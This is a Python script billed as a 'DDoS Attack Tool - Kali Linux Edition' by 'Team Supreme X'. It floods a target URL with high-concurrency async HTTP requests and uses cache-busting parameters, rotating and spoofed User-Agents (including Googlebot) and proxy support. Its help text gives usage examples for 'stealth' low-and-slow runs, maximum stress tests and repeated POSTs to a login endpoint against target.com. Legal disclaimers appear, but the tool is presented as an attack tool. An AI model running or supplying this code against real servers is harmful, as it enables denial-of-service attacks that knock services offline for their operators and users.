#!/usr/bin/env python3
"""
DDoS Attack Tool - Kali Linux Edition
High-performance DDoS Attack for powerful servers attacks

Developed by Team Supreme X
Optimized for Kali Linux and Penetration Testing

Features:
- Async I/O for maximum performance
- Cache busting for accurate testing
- User-Agent rotation
- Custom headers and methods
- Rate limiting
- SSL/TLS support
- Detailed statistics and reporting

Legal Notice: Only use on systems you own or have explicit written authorization to test.
Unauthorized use is illegal and unethical.
"""

import asyncio
import aiohttp
import time
import argparse
from datetime import datetime
from collections import defaultdict
import statistics
import json
import random
import string
import sys
import platform
from urllib.parse import urlparse, urlencode
try:
    import aiodns
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

class AdvancedLoadTester:
    def __init__(self, url, num_requests, concurrency, duration=None, 
                 method='GET', headers=None, body=None, timeout=30,
                 no_cache=False, random_user_agent=False, keep_alive=True,
                 verify_ssl=True, rate_limit=None, proxy=None, save_responses=False):
        self.url = url
        self.num_requests = num_requests
        self.concurrency = concurrency
        self.duration = duration
        self.method = method.upper()
        self.headers = headers or {}
        self.body = body
        self.timeout = timeout
        self.no_cache = no_cache
        self.random_user_agent = random_user_agent
        self.keep_alive = keep_alive
        self.verify_ssl = verify_ssl
        self.rate_limit = rate_limit
        self.proxy = proxy
        self.save_responses = save_responses
        
        self.results = defaultdict(int)
        self.response_times = []
        self.errors = []
        self.start_time = None
        self.end_time = None
        self.completed_requests = 0
        self.bytes_received = 0
        self.request_counter = 0
        self.response_samples = []
        
        # Extended user agents for better rotation (including mobile and bots)
        self.user_agents = [
            # Desktop browsers
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
            # Mobile browsers
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            # Bots (for testing bot detection)
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
        ]
        
        # Print system info for Kali users
        self.print_system_info()
    
    def print_system_info(self):
        """Print system information for debugging"""
        pass  # Will be called but won't print unless verbose
    
    def print_banner(self):
        """Print tool banner"""
        banner = """
╔═══════════════════════════════════════════════════════════════════════╗
║                                                                       ║
║        DDoS Attack Tool - Kali Linux Edition               ║
║                    Developed by Team Supreme X                        ║
║                                                                       ║
╚═══════════════════════════════════════════════════════════════════════╝
"""
        print(banner)
        
        # Check if running on Kali
        try:
            with open('/etc/os-release', 'r') as f:
                if 'kali' in f.read().lower():
                    print("✓ Kali Linux detected")
        except:
            pass
        
        # Check for optional dependencies
        if DNS_AVAILABLE:
            print("✓ aiodns available (enhanced DNS performance)")
        else:
            print("⚠ aiodns not installed (install for better performance: pip3 install aiodns)")
        
        print()
    
    def get_cache_busting_url(self):
        """Add cache-busting parameter to URL"""
        if not self.no_cache:
            return self.url
        
        # Generate random string for cache busting
        random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        separator = '&' if '?' in self.url else '?'
        return f"{self.url}{separator}_nocache={random_str}&_t={int(time.time() * 1000)}"
    
    def get_request_headers(self):
        """Get headers for request with optional cache control and user agent"""
        headers = self.headers.copy()
        
        if self.no_cache:
            headers.update({
                'Cache-Control': 'no-cache, no-store, must-revalidate',
                'Pragma': 'no-cache',
                'Expires': '0'
            })
        
        if self.random_user_agent:
            headers['User-Agent'] = random.choice(self.user_agents)
        
        return headers
        
    async def send_request(self, session):
        """Send a single async HTTP request"""
        try:
            # Rate limiting
            if self.rate_limit:
                await asyncio.sleep(1.0 / self.rate_limit)
            
            url = self.get_cache_busting_url()
            headers = self.get_request_headers()
            
            start = time.time()
            
            async with session.request(
                self.method,
                url,
                headers=headers,
                data=self.body,
                timeout=aiohttp.ClientTimeout(total=self.timeout),
                ssl=self.verify_ssl,
                proxy=self.proxy
            ) as response:
                content = await response.read()
                elapsed = time.time() - start
                
                self.results[response.status] += 1
                self.response_times.append(elapsed)
                self.completed_requests += 1
                self.bytes_received += len(content)
                
                # Save sample responses for analysis (first 5)
                if self.save_responses and len(self.response_samples) < 5:
                    self.response_samples.append({
                        'status': response.status,
                        'headers': dict(response.headers),
                        'body': content[:500].decode('utf-8', errors='ignore'),
                        'time': elapsed
                    })
                
        except asyncio.TimeoutError:
            self.results['timeout'] += 1
            self.errors.append('Timeout')
        except aiohttp.ClientError as e:
            self.results['connection_error'] += 1
            self.errors.append(f'Connection: {str(e)[:50]}')
        except Exception as e:
            self.results['error'] += 1
            self.errors.append(f'Error: {str(e)[:50]}')
    
    async def worker(self, session, request_queue):
        """Worker coroutine that processes requests from queue"""
        while True:
            try:
                await request_queue.get()
                await self.send_request(session)
                request_queue.task_done()
            except asyncio.CancelledError:
                break
    
    async def run_duration_test(self):
        """Run test for a specific duration"""
        print(f"Running duration-based test for {self.duration} seconds...")
        
        connector = aiohttp.TCPConnector(
            limit=self.concurrency,
            limit_per_host=self.concurrency,
            ttl_dns_cache=300,
            force_close=not self.keep_alive
        )
        
        async with aiohttp.ClientSession(connector=connector) as session:
            self.start_time = time.time()
            end_time = self.start_time + self.duration
            
            tasks = []
            while time.time() < end_time:
                if len(tasks) < self.concurrency:
                    task = asyncio.create_task(self.send_request(session))
                    tasks.append(task)
                else:
                    done, tasks = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
            
            if tasks:
                await asyncio.wait(tasks)
            
            self.end_time = time.time()
    
    async def run_count_test(self):
        """Run test for a specific number of requests"""
        print(f"Running request-based test with {self.num_requests} requests...")
        
        request_queue = asyncio.Queue()
        for _ in range(self.num_requests):
            request_queue.put_nowait(None)
        
        connector = aiohttp.TCPConnector(
            limit=self.concurrency,
            limit_per_host=self.concurrency,
            ttl_dns_cache=300,
            force_close=not self.keep_alive
        )
        
        async with aiohttp.ClientSession(connector=connector) as session:
            self.start_time = time.time()
            
            workers = [
                asyncio.create_task(self.worker(session, request_queue))
                for _ in range(self.concurrency)
            ]
            
            await request_queue.join()
            
            for worker in workers:
                worker.cancel()
            
            await asyncio.gather(*workers, return_exceptions=True)
            
            self.end_time = time.time()
    
    async def run(self):
        """Execute the load test"""
        self.print_banner()
        
        print(f"{'='*70}")
        print(f"Test Configuration")
        print(f"{'='*70}")
        print(f"Target URL: {self.url}")
        print(f"Method: {self.method}")
        print(f"Concurrency: {self.concurrency}")
        if self.duration:
            print(f"Duration: {self.duration} seconds")
        else:
            print(f"Total Requests: {self.num_requests}")
        print(f"Timeout: {self.timeout}s")
        print(f"Cache Busting: {'Enabled' if self.no_cache else 'Disabled'}")
        print(f"Random User-Agent: {'Enabled' if self.random_user_agent else 'Disabled'}")
        print(f"Keep-Alive: {'Enabled' if self.keep_alive else 'Disabled'}")
        print(f"SSL Verification: {'Enabled' if self.verify_ssl else 'Disabled'}")
        if self.rate_limit:
            print(f"Rate Limit: {self.rate_limit} req/s")
        if self.proxy:
            print(f"Proxy: {self.proxy}")
        print(f"{'='*70}\n")
        
        # Security warning
        print("⚠️  WARNING: Only test systems you own or have authorization to test!")
        print("⚠️  Unauthorized testing is illegal and unethical.\n")
        
        print(f"Starting test at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}...\n")
        
        if self.duration:
            await self.run_duration_test()
        else:
            await self.run_count_test()
        
        self.print_results()
        
        # Save response samples if enabled
        if self.save_responses and self.response_samples:
            self.save_response_samples()
    
    def print_results(self):
        """Print detailed test results"""
        duration = self.end_time - self.start_time
        total_requests = sum(self.results.values())
        
        print(f"\n{'='*70}")
        print(f"Test Results")
        print(f"{'='*70}")
        print(f"Completed in: {duration:.2f} seconds")
        print(f"Total requests: {total_requests}")
        print(f"Successful requests: {self.completed_requests}")
        print(f"Failed requests: {total_requests - self.completed_requests}")
        print(f"Requests per second: {total_requests/duration:.2f}")
        print(f"Average concurrency: {self.concurrency}")
        
        if self.bytes_received > 0:
            mb_received = self.bytes_received / (1024 * 1024)
            throughput = mb_received / duration
            print(f"Data received: {mb_received:.2f} MB")
            print(f"Throughput: {throughput:.2f} MB/s")
        
        print(f"\n{'='*70}")
        print(f"Status Code Distribution:")
        print(f"{'='*70}")
        for status, count in sorted(self.results.items()):
            percentage = (count/total_requests*100) if total_requests > 0 else 0
            bar_length = int(percentage / 2)
            bar = '█' * bar_length
            print(f"  {str(status):>20}: {count:>6} ({percentage:>5.1f}%) {bar}")
        
        if self.response_times:
            self.response_times.sort()
            avg_time = statistics.mean(self.response_times)
            median_time = statistics.median(self.response_times)
            min_time = min(self.response_times)
            max_time = max(self.response_times)
            
            try:
                stdev_time = statistics.stdev(self.response_times)
            except:
                stdev_time = 0
            
            percentiles = {
                50: self.response_times[int(len(self.response_times)*0.50)],
                75: self.response_times[int(len(self.response_times)*0.75)],
                90: self.response_times[int(len(self.response_times)*0.90)],
                95: self.response_times[int(len(self.response_times)*0.95)],
                99: self.response_times[int(len(self.response_times)*0.99)],
            }
            
            print(f"\n{'='*70}")
            print(f"Response Time Statistics (milliseconds):")
            print(f"{'='*70}")
            print(f"  Average:  {avg_time*1000:>8.2f}ms")
            print(f"  Median:   {median_time*1000:>8.2f}ms")
            print(f"  Std Dev:  {stdev_time*1000:>8.2f}ms")
            print(f"  Min:      {min_time*1000:>8.2f}ms")
            print(f"  Max:      {max_time*1000:>8.2f}ms")
            print(f"\n  Percentiles:")
            for p, value in percentiles.items():
                print(f"    {p}th:    {value*1000:>8.2f}ms")
        
        if self.errors:
            error_counts = defaultdict(int)
            for error in self.errors:
                error_counts[error] += 1
            
            print(f"\n{'='*70}")
            print(f"Error Summary:")
            print(f"{'='*70}")
            for error, count in sorted(error_counts.items(), key=lambda x: x[1], reverse=True)[:10]:
                print(f"  {error}: {count}")
            if len(self.errors) > 10:
                print(f"  ... and {len(self.errors)-10} more errors")
        
        success_rate = (self.results.get(200, 0) / total_requests * 100) if total_requests > 0 else 0
        print(f"\n{'='*70}")
        print(f"Summary:")
        print(f"{'='*70}")
        print(f"  Success Rate (200 OK): {success_rate:.2f}%")
        print(f"  Failed Requests: {total_requests - self.results.get(200, 0)}")
        print(f"  Throughput: {total_requests/duration:.2f} req/s")
        if self.response_times:
            print(f"  Avg Response Time: {avg_time*1000:.2f}ms")
        print(f"{'='*70}\n")
        
        # Security assessment hints for Kali users
        if total_requests > 100:
            print("Security Assessment Notes:")
            if success_rate < 90:
                print("  ⚠ Low success rate - server may be struggling under load")
            if self.results.get('timeout', 0) > total_requests * 0.1:
                print("  ⚠ High timeout rate - possible DoS vulnerability")
            if max_time > 5.0:
                print("  ⚠ Very slow responses detected - investigate bottlenecks")
            if len(set([r for r in self.results.keys() if isinstance(r, int)])) > 3:
                print("  ℹ Multiple status codes - check error handling")
            print()
    
    def save_response_samples(self):
        """Save response samples to file for analysis"""
        filename = f"response_samples_{int(time.time())}.json"
        try:
            with open(filename, 'w') as f:
                json.dump(self.response_samples, f, indent=2)
            print(f"[*] Response samples saved to: {filename}\n")
        except Exception as e:
            print(f"[!] Failed to save response samples: {e}\n")

def main():
    parser = argparse.ArgumentParser(
        description='DDoS Attack Tool - Kali Linux Edition (Production Ready)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic test with 10,000 requests and 100 concurrent connections
  python3 main-kali-linux.py http://localhost:8000 -n 10000 -c 100
  
  # Test with cache busting enabled (bypass all caches)
  python3 main-kali-linux.py http://localhost:8000 -n 5000 -c 100 --no-cache
  
  # Run for 60 seconds with 200 concurrent connections
  python3 main-kali-linux.py http://localhost:8000 -d 60 -c 200
  
  # Maximum stress test with all features
  python3 main-kali-linux.py http://localhost:8000 -n 50000 -c 500 --no-cache --random-ua
  
  # POST request with custom headers and body
  python3 main-kali-linux.py http://localhost:8000/api -n 5000 -c 50 -m POST \\
    -H "Content-Type: application/json" --body '{"test": "data"}'
  
  # Rate-limited test (100 requests per second)
  python3 main-kali-linux.py http://localhost:8000 -n 1000 -c 10 --rate-limit 100
  
  # Test with proxy (for Burp Suite integration)
  python3 main-kali-linux.py http://localhost:8000 -n 500 -c 25 --proxy http://127.0.0.1:8080
  
  # Stealth test (low and slow)
  python3 main-kali-linux.py http://target.com -n 500 -c 10 --rate-limit 20 --random-ua

Kali Linux Specific:
  # Test discovered endpoint from nmap/nikto
  python3 main-kali-linux.py http://target.com/admin -n 1000 -c 50 --no-cache
  
  # Test API with authorization (from Burp Suite)
  python3 main-kali-linux.py http://target.com/api -n 2000 -c 100 \\
    -H "Authorization: Bearer token123" --no-cache
  
  # Test login endpoint for rate limiting
  python3 main-kali-linux.py http://target.com/login -n 500 -c 25 -m POST \\
    --body "username=admin&password=test" --no-cache

Legal Notice:
  Only use on systems you own or have explicit written authorization to test.
  Unauthorized testing is illegal and may result in criminal prosecution.
        """
    )
    
    parser.add_argument('url', help='Target URL to test')
    parser.add_argument('-n', '--requests', type=int, default=1000,
                       help='Total number of requests (default: 1000)')
    parser.add_argument('-c', '--concurrency', type=int, default=50,
                       help='Number of concurrent connections (default: 50)')
    parser.add_argument('-d', '--duration', type=int,
                       help='Test duration in seconds (overrides -n)')
    parser.add_argument('-m', '--method', default='GET',
                       help='HTTP method: GET, POST, PUT, DELETE, etc. (default: GET)')
    parser.add_argument('-H', '--header', action='append',
                       help='Custom header (format: "Key: Value"), can be used multiple times')
    parser.add_argument('--body', help='Request body for POST/PUT requests')
    parser.add_argument('--timeout', type=int, default=30,
                       help='Request timeout in seconds (default: 30)')
    parser.add_argument('--no-cache', action='store_true',
                       help='Enable cache busting (adds random parameters and cache headers)')
    parser.add_argument('--random-ua', action='store_true',
                       help='Use random User-Agent headers for each request')
    parser.add_argument('--no-keep-alive', action='store_true',
                       help='Disable HTTP keep-alive (creates new connection each time)')
    parser.add_argument('--no-verify-ssl', action='store_true',
                       help='Disable SSL certificate verification (use for self-signed certs)')
    parser.add_argument('--rate-limit', type=int,
                       help='Limit requests per second (e.g., 100 for 100 req/s)')
    parser.add_argument('--proxy', type=str,
                       help='Proxy URL (e.g., http://127.0.0.1:8080 for Burp Suite)')
    parser.add_argument('--save-responses', action='store_true',
                       help='Save sample responses to file for analysis')
    parser.add_argument('-o', '--output', type=str,
                       help='Save results to file')
    
    args = parser.parse_args()
    
    # Validate URL
    if not args.url.startswith(('http://', 'https://')):
        print("❌ Error: URL must start with http:// or https://")
        sys.exit(1)
    
    # Parse headers
    headers = {}
    if args.header:
        for header in args.header:
            if ':' in header:
                key, value = header.split(':', 1)
                headers[key.strip()] = value.strip()
    
    # Create tester instance
    tester = AdvancedLoadTester(
        url=args.url,
        num_requests=args.requests,
        concurrency=args.concurrency,
        duration=args.duration,
        method=args.method,
        headers=headers,
        body=args.body,
        timeout=args.timeout,
        no_cache=args.no_cache,
        random_user_agent=args.random_ua,
        keep_alive=not args.no_keep_alive,
        verify_ssl=not args.no_verify_ssl,
        rate_limit=args.rate_limit,
        proxy=args.proxy,
        save_responses=args.save_responses
    )
    
    # Run test
    try:
        # Redirect output if specified
        if args.output:
            original_stdout = sys.stdout
            with open(args.output, 'w') as f:
                sys.stdout = f
                asyncio.run(tester.run())
            sys.stdout = original_stdout
            print(f"\n✓ Results saved to: {args.output}")
        else:
            asyncio.run(tester.run())
    except KeyboardInterrupt:
        print("\n\n⚠️  Test interrupted by user!")
        if tester.start_time:
            tester.end_time = time.time()
            tester.print_results()
        sys.exit(0)
    except Exception as e:
        print(f"\n❌ Error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()
